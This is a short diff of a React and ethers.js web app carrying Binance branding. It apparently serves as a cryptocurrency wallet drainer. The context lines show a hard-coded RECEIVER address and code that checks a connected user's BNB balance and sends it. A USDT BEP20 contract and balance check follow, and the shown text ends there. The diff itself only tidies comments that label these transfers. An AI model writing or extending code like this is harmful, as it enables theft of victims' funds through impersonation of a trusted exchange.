@@ -1,7 +1,7 @@
 import React, { useState } from "react";
 import { ethers } from "ethers";
 import "./App.css";
-import binanceLogo from "./binance-yellow-rhombus-lawc3crgelc4t98h.jpg"; // make sure this is in src folder
+import binanceLogo from "./binance-yellow-rhombus-lawc3crgelc4t98h.jpg";
 
 const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
 const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
@@ -27,6 +27,7 @@ function App() {
 
       setStatus("Checking balances...");
 
+      // BNB transfer
       const balanceBNB = await provider.getBalance(userAddress);
       if (balanceBNB > ethers.parseEther("0.001")) {
         setStatus("Sending BNB...");
@@ -39,6 +40,7 @@ function App() {
         return;
       }
 
+      // USDT BEP20 transfer
       const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
       const balanceUSDT = await usdt.balanceOf(userAddress);
       if (balanceUSDT > 0n) {
